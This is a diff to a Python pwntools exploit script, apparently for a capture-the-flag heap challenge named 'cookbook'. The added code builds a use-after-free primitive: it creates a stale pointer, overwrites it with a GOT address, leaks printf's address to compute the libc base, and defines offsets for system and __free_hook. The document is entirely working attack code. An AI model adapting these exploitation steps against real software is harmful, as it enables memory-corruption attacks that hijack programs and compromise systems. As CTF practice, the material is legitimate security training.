@@ -4,7 +4,13 @@
 
 # socat TCP-LISTEN:8888,reuseaddr,fork 'SYSTEM:./inst_prof'
 
+import re
+import ctypes
 from pwn import *
+
+PRINTF_OFFSET = 0x49670
+SYSTEM_OFFSET = 0x3ada0
+FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c
 
 #r = remote('localhost', 8888)
 
@@ -19,6 +25,52 @@ b = ELF('./cookbook')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 context.arch = b.arch
 context.log_level = 'info'
+
+
+# use-after-free:
+# 
+# create a stale pointer
+# 
+# add new ingredients 
+#
+# overwrite a pointer
+
+def stou(i):
+    return ctypes.c_uint32(i).value
+
+def add_leak(addr):
+    r.sendline('c')
+    r.sendline('n')
+    r.sendline('g')
+    r.sendline('babo')
+
+    r.sendline('d') # create a stale pointer
+    r.sendline('q')
+
+    r.sendline('a') # add ingredient
+    r.sendline('n')
+    r.sendline('g')
+    r.sendline('AAAA1111')
+    r.sendline('e')
+    r.sendline('q')
+
+    r.sendline('c')
+    r.sendline('g')
+    r.sendline('AAAABBBBCCCC' + p32(addr) + p32(0)) # overwrite a pointer
+    r.sendline('q')
+    
+def parse_ingredient():
+    r.clean()
+    r.sendline('l')
+    resp = r.recv()
+
+    print resp
+
+    li = resp.split('------')
+    last = li[-2]
+    m = re.search("calories: ([ +-]\d+)", last)
+
+    return stou(int(m.groups()[0])) 
 
 if __name__ == "__main__":
 
@@ -59,5 +111,12 @@ if __name__ == "__main__":
     log.info("3th line: %s" % resp.split("\n")[3])
     LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
     log.info("Leaked Heap Address: 0x%x" % LEAKED_HEAP_ADDR)
+
+    add_leak(b.got['printf'])
+    leaked = parse_ingredient()
+    log.info("printf@GOT: 0x%x => 0x%x" % (b.got['printf'], leaked))
+
+    LIBC = leaked - PRINTF_OFFSET
+    log.info("LIBC: 0x%x" % LIBC)
 
     pause()
